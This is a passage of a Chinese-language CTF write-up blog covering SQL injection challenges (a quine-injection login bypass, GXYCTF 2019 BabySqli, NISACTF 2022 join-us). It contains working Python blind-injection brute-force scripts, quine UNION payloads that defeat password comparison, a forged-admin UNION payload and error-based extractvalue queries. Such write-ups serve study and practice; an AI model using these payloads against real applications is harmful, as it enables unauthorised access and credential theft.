class="line">?&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;/index.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;账号&quot;&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;&lt;br/&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; / value=&quot;登录&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure>
<p>通过这段代码可以知道，我们需要传入username和password两个值，然后在经过password检验的时候会到达checkSql函数，而且这个函数过滤掉了大部分常用的sql注入关键词<br>关键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br></pre></td></tr></table></figure>
<p>所以我们的目的就是找到admin对应的password</p>
<p>虽然checkSql已经过滤掉了大部分的关键词，但是like &#x2F;**&#x2F; ‘ %都没有被过滤，可以编写脚本爆破密码 ，我这里直接找了一个师傅的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://node4.anna.nssctf.cn:28213/index.php&quot;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for a in range(1,50):</span><br><span class="line">    for i in string.printable:</span><br><span class="line">       data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:f&quot;1&#x27;or/**/password/**/like/**/&#x27;&#123;flag+i&#125;%&#x27;#&quot;&#125;</span><br><span class="line">       rsp=requests.post(url,data=data)</span><br><span class="line">       time.sleep(0.1)</span><br><span class="line">       if &quot;something wrong&quot; not in rsp.text:</span><br><span class="line">           flag+=i</span><br><span class="line">           print(flag)</span><br><span class="line">           break</span><br></pre></td></tr></table></figure>

<p>本题考察的是quine方法<br>quine方法</p>
<p>Quine 方法是一种用于绕过基于白名单（whitelist）的 SQL 注入防御措施的技术方法。白名单是一种更安全的防御措施，它会检查用户输入中是否包含一些特定的字符或字符串，并只允许这些字符或字符串被用于查询。这样可以防止一些恶意的操作和语句被执行。<br>Quine 方法是通过构造一些特殊的查询语句来绕过这种白名单防御措施。例如，在执行查询时，攻击者可以构造以下语句来绕过白名单：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; AND column_name LIKE 0x2575716572795f646574656374</span><br></pre></td></tr></table></figure>
<p>在这个语句中，攻击者使用了 HEX 编码来表示 LIKE 运算符右侧的字符串，这个字符串实际上是 “unique_detect” 的 HEX 编码。由于白名单只允许使用特定的字符或字符串，而不允许使用特定的运算符或操作，因此攻击者可以使用这种方法来绕过白名单的限制，从而执行恶意的操作。<br>还有一种方式就是我们可以尝试扫目录，然后有&#x2F;phpmyadmin路由<br>然后admin和admin进去，里面有密码，最后拿到flag<br>这里我试了发现我一开始可以，后面又不可以了<br>这里有一个脚本来测试密码，直接来拿到我们的密码，但是有一个小的细节需要我们来注意<br>就是你尝试登陆了一次，<a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28758/%E4%BC%9A%E5%8F%98%E6%88%90http://node4.anna.nssctf.cn:28758/index.php.%E4%BD%86%E6%98%AF%E5%9C%A8%E8%84%9A%E6%9C%AC%E9%87%8C%EF%BC%8Chttp://node4.anna.nssctf.cn:28758/index.php%E8%BF%99%E4%B8%AA%E8%B7%91%E6%AD%A5%E5%87%BA%E6%9D%A5">http://node4.anna.nssctf.cn:28758/会变成http://node4.anna.nssctf.cn:28758/index.php.但是在脚本里，http://node4.anna.nssctf.cn:28758/index.php这个跑步出来</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests,time</span><br><span class="line">alp = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span><br><span class="line">def get_pass():</span><br><span class="line">    url = &quot;http://node4.anna.nssctf.cn:28758/&quot;</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        for i in alp:</span><br><span class="line">            data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:f&quot;1&#x27;or/**/password/**/like/**/&#x27;&#123;flag+i&#125;%&#x27;#&quot;&#125;</span><br><span class="line">            resp = requests.post(url=url,data=data)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">            if &quot;something wrong&quot; not in resp.text:</span><br><span class="line">                flag+=i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">            elif &quot;~&quot; in i:</span><br><span class="line">                return</span><br><span class="line">get_pass()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个脚本是利用有的关键的地方没有过滤达到的，不是比较经典这种题目的做法</p>
<h1 id="方法三：也是就quine注入的解法"><a href="#方法三：也是就quine注入的解法" class="headerlink" title="方法三：也是就quine注入的解法"></a>方法三：也是就quine注入的解法</h1><p>这里有一个大佬写的文章，可以参考一下：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253570">https://www.anquanke.com/post/id/253570</a><br>其实如果直接看这道题其实给出了所使用的sql语句，在语句中给出了表user，包括黑名单也在checkSql中都已经给出了，那么按理看这不是一个困难的注入，可以当成一个简单的盲注。通过使用like替换&#x3D;，benchmark（或者其他笛卡儿积等）替换sleep，mid替换substr，&#x2F;**&#x2F;替换Space，使用如下paload即可完成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),&#123;&#125;,1)) like &#123;&#125;),(select benchmark(4999999,md5(&#x27;test&#x27;))),1)#</span><br></pre></td></tr></table></figure>
<p>但是很遗憾，这样注出来user表中没有密码。</p>
<p>如果仔细看题目中这个比较判断的逻辑，我们就可以发现端倪。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line"></span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">    die($FLAG);</span><br></pre></td></tr></table></figure>
<p>简单来看，要求的是执行$sql的结果与$password相同，那么除了正常逻辑的密码相同会产生相等，如果我们的输入与最后的结果相等，那么一样可以绕过验证。这种技术就是Quine<br>从payload来理解quine<br>示例payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure>
<p>这样看起来不是很清楚，我们接下来从内层一步一步拆开看。<br>从大结构上，这段payload是由两个大REPLACE完成的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REPLACE ( string_expression , string_pattern , string_replacement )</span><br><span class="line">即将string_expression中所有string_pattern替换为string_replacement</span><br></pre></td></tr></table></figure>
<p>内层payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39))</span><br></pre></td></tr></table></figure>
<p>我们暂且把它当作A，这里面有一个字符串<br>“&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;SELECT&#x2F;<strong>&#x2F;REPLACE(REPLACE(“.”,CHAR(34),CHAR(39)),CHAR(46),”.”)&#x2F;</strong>&#x2F;AS&#x2F;**&#x2F;ch3ns1r#<br>我们暂且把它当作B。<br>简化一下最初的payload就是这个样子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union/**/SELECT/**/REPLACE(A,CHAR(46),B)/**/AS/**/ch3ns1r#</span><br><span class="line">其中：</span><br><span class="line">A：REPLACE(B,CHAR(34),CHAR(39))</span><br><span class="line">B：</span><br><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">到这里应该就看的比较清楚了，有点像套娃。A这个形式就是Quine的基本形式，可以描述为如下形式：</span><br><span class="line"></span><br><span class="line">REPLACE(str,编码的间隔符,str)</span><br><span class="line"></span><br><span class="line">str可描述为如下形式：</span><br><span class="line"></span><br><span class="line">REPLACE(间隔符,编码的间隔符,间隔符)</span><br><span class="line"></span><br><span class="line">这样运算后，最后的结果又是：</span><br><span class="line"></span><br><span class="line">REPLACE(str,编码的间隔符,str)</span><br><span class="line"></span><br><span class="line">我们举个例子加深理解，设间隔符为&#x27;.&#x27;，编码的间隔符为CHAR(46)，那么str为：</span><br><span class="line"></span><br><span class="line">REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)</span><br><span class="line"></span><br><span class="line">放入最后的语句为：</span><br><span class="line"></span><br><span class="line">REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">执行的结果为（先执行的CHAR(46)）：</span><br><span class="line"></span><br><span class="line">REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">（注意以上的语句还没有考虑存在单双引号的情况）</span><br><span class="line"></span><br><span class="line">这样就达到了输入与输出一致的效果。</span><br></pre></td></tr></table></figure>
<p>从单双引号来理解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"> 从解决单双引号理解Quine</span><br><span class="line"></span><br><span class="line">细心点的话就会发现，这里还存在单双引号的问题，我们重新考虑存在单双引号的情况。</span><br><span class="line"></span><br><span class="line">Quine的基本形式：</span><br><span class="line"></span><br><span class="line">REPLACE(&#x27;str&#x27;,编码的间隔符,&#x27;str&#x27;)</span><br><span class="line"></span><br><span class="line">str描述为如下形式：</span><br><span class="line"></span><br><span class="line">REPLACE(&quot;间隔符&quot;,编码的间隔符,&quot;间隔符&quot;)</span><br><span class="line"></span><br><span class="line">这里str中的间隔符使用双引号的原因是，str已经被单引号包裹，为避免引入新的转义符号，间隔符需要使用双引号。</span><br><span class="line"></span><br><span class="line">运算后的结果是：</span><br><span class="line"></span><br><span class="line">REPLACE(&quot;str&quot;,编码的间隔符,&quot;str&quot;)</span><br><span class="line"></span><br><span class="line">但是我们希望str仍然使用单引号包裹，怎么办？</span><br><span class="line"></span><br><span class="line">我们这样考虑，如果先使用REPLACE将str的双引号换成单引号，这样最后就不会出现引号不一致的情况了。</span><br><span class="line"></span><br><span class="line">Quine的升级版基本形式：</span><br><span class="line"></span><br><span class="line">REPLACE(REPLACE(&#x27;str&#x27;,CHAR(34),CHAR(39)),编码的间隔符,&#x27;str&#x27;)</span><br><span class="line"></span><br><span class="line">str的升级版形式：</span><br><span class="line"></span><br><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,CHAR(34),CHAR(39)),编码的间隔符,&quot;间隔符&quot;)</span><br><span class="line"></span><br><span class="line">这里的CHAR(34)是双引号，CHAR(39)是单引号，如果CHAR被禁了0x22和0x27是一样的效果。</span><br><span class="line"></span><br><span class="line">这里我们慢一点。</span><br><span class="line"></span><br><span class="line">第一步：</span><br><span class="line"></span><br><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,CHAR(34),CHAR(39)),编码的间隔符,&quot;间隔符&quot;)</span><br><span class="line">变成了</span><br><span class="line">REPLACE(REPLACE(&#x27;间隔符&#x27;,CHAR(34),CHAR(39)),编码的间隔符,&#x27;间隔符&#x27;)</span><br><span class="line"></span><br><span class="line">第二步：</span><br><span class="line"></span><br><span class="line">REPLACE(&#x27;单引号str&#x27;,编码的间隔符,&#x27;str&#x27;)</span><br><span class="line">变成了</span><br><span class="line">REPLACE(REPLACE(&#x27;str&#x27;,CHAR(34),CHAR(39)),编码的间隔符,&#x27;str&#x27;)</span><br><span class="line"></span><br><span class="line">我们同样举刚才的例子，设间隔符为&#x27;.&#x27;，编码的间隔符为CHAR(46)，那么str为：</span><br><span class="line"></span><br><span class="line">REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)</span><br><span class="line"></span><br><span class="line">放入最后的语句为：</span><br><span class="line"></span><br><span class="line">REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">执行的结果为（先执行的内层REPLACE）：</span><br><span class="line"></span><br><span class="line">REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">实际结果：</span><br><span class="line"></span><br><span class="line"> MySQL  localhost:3306 ssl  SQL &gt; SELECT REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| REPLACE(REPLACE(&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.0004 sec)</span><br><span class="line"></span><br><span class="line">现在就完全一致了。</span><br></pre></td></tr></table></figure>
<p>但是事实上这张表其实是个空表，只有构造输入输出完全一致的语句，才能绕过限制得到FLAG，主要利用replace(str,old_string,new_string)进行构造，构造思路如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>
<p>输入和输出的结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) ;</span><br></pre></td></tr></table></figure>
<p>这样其实还没有达到输入和输出一致的问题,因为还有单引号和双引号不一致，所以要解决单双引号的问题，再套一层replace，将双引号替换成单引号即可<br>接下来解决单双引号的问题<br>输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
<p>题中还过滤了char，用chr或者直接0x代替即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;1&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;1&quot;)#&#x27;,CHAR(34),CHAR(39)),CHAR(49),&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;1&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;1&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
<p>下面这个作为一个参考，实际注入时给我弹了waf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
<h1 id="GXYCTF-2019-BabySqli"><a href="#GXYCTF-2019-BabySqli" class="headerlink" title="[GXYCTF 2019]BabySqli"></a>[GXYCTF 2019]BabySqli</h1><p>1分<br>SQL注入POST注入关键字绕过<br>一进去时一个登陆界面，我先试了下账号admin，密码：1<br>回显错误<br>我们查看网页源代码，发现有个search.php文件<br>进去是这个,绿色字体显示，一般都是重点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
<p>放入我们的一键解码工具，发现有用的信息应该是这个<br>先base32解码，在base64解码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>
<p>我们可以先fuzz看一下过滤了哪些字符<br>我们发现order被禁了，可以使用Order来进行绕过<br>也可以直接用union来一个一个试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
<p>这个报错，且不是显示wrong pass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,2,3#</span><br></pre></td></tr></table></figure>
<p>报错的是和密码错误一样的显示<br>说明字段数为3<br>然后我们开始猜测admin是第几个字段，发现是第二个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,&#x27;admin&#x27;,3#</span><br></pre></td></tr></table></figure>
<p>后面也是第一次见到过这种做法<br>意思就是插入一条临时的数据admin，密码为md5加密后的1，然后密码为1，就会自动登陆上了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1</span><br></pre></td></tr></table></figure>
<p>这个后面接的要看源码，或者抓包来看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">	&lt;form action=&quot;search.php&quot; method=&quot;post&quot; style=&quot;margin-top: 300&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;UserName&quot; required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;input type=&quot;password&quot; style=&quot;margin-top: 20&quot; name=&quot;pw&quot; placeholder=&quot;password&quot; required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;button style=&quot;margin-top:20;&quot; type=&quot;submit&quot;&gt;登录&lt;/button&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>
<h1 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h1><p>1分<br>报错注入无列名注入SQL注入<br>题目描述</p>
<p>欢迎加入天伦家园的大家庭<br>这里又会有一种没有见过的注入方式或手法<br>一进去是有一个可以登陆或者注册的页面<br>我们登陆一下然后抓包就会有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /dl.php HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21947</span><br><span class="line">Content-Length: 4</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://node5.anna.nssctf.cn:21947</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node5.anna.nssctf.cn:21947/dl.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">tt=1</span><br></pre></td></tr></table></figure>
<p>输入’报错，有sql注入<br>发现过滤了and和database还有columns<br>过滤了and我们这里选择使用管道符<br>过滤and的方式<br>1.大小写绕过<br>2.双写绕过<br>3.管道符执行<br>4.url编码<br>sql查询一个不存在的表会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt=1&#x27;||(select * from aa)# =&gt;报错得到库名字sqlsql</span><br></pre></td></tr></table></figure>
<p>爆表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br></pre></td></tr></table></figure>
<p>XPATH syntax error: ‘~Fal_flag,output’<br>列名的注入coulmns被过滤了</p>
<h1 id="使用join注入"><a href="#使用join注入" class="headerlink" title="使用join注入"></a>使用join注入</h1><p>对于过滤了逗号的，也可以使用<br>就是对于一种情况，一个表里面有我们的username，和passwd等信息<br>还有一个表有邮箱信息<br>我怎么才能查询users表用户的email都是多少，这时要查询的就是两张表<br>语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select u.*,e.* from users u,emails e where u.id=e.id;</span><br></pre></td></tr></table></figure>
